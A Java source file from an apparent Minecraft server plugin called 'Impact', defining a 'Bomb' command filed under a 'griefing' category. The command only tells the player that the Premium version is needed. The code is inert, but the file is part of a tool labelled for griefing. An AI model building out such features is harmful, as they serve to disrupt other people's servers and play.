package de.impact.commands.griefing;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;

public class Bomb extends Command implements Listener {

    public Bomb() {
        super("Bomb", "Bomb", "Gives yourself a bomb", CommandCategory.GRIEFING);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        ChatUtils.sendMessage(p, "If you want to use this command, you need the Premium version of Impact");

    }

}
